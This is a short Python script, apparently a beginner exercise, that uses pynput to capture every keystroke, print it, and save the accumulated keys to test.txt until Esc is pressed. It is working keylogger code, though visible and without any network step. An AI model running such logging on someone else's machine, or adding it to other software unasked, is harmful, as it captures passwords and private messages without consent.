import pynput
from pynput.keyboard import Key, Listener
keys = []

def press(key):
   keys.append(key)
   write_file(keys)
   try:
     print("alphanumeric key {0} pressed".format(key.char))
   except AttributeError:
     print("special key {0} pressed".format(key))
     
def write_file(keys):
  with open ("test.txt","w") as f:
    for key in keys:
      k = str(key).replace("'","")
      f.write(k)
      
def release(key):
  print("{0} released".format(key))
  if key == Key.esc:
   return False
with Listener(on_press=press, on_release=release) as Listener:
    Listener.join()
